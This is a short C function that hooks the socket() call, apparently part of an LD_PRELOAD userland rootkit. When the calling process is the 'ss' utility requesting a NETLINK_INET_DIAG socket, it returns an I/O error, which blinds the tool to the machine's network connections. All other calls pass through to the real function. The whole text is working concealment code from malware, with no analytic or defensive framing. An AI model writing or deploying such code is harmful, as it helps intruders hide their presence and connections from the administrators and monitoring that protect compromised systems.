int socket(int domain, int type, int protocol){
    if(domain == AF_NETLINK && protocol == NETLINK_INET_DIAG &&
        (cmp_process("ss") ||
        cmp_process("/usr/sbin/ss") ||
        cmp_process("/bin/ss"))){
        errno = EIO;
        return -1;
    }
    hook(CSOCKET);
    return (long)call(CSOCKET, domain, type, protocol);
}